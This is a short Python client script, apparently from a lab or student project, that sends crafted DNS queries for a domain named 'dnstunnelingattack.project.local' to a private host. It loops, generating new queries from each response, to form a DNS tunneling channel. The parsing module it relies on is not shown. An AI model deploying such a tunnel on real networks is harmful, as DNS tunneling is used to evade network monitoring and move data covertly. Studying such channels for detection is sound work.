import socket
from os import urandom
from DNSResponse import DNSResponse

host = "172.23.0.23"
port = 53

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((host, port))

try:
    hello_query = (
        urandom(2)
        + b"\x01 \x00\x01\x00\x00\x00\x00\x00\x00\x12dnstunnelingattack\x07project\x05local\x00\x00\x01\x00\x01"
    )
    s.send(hello_query)

    while True:
        response = s.recv(1024 * 1000000)
        print("receive", response)
        dnsresponse = DNSResponse(response)
        query = dnsresponse.generateQuery()
        s.send(query)

except KeyboardInterrupt:
    print("Client stoped.")

finally:
    s.close()
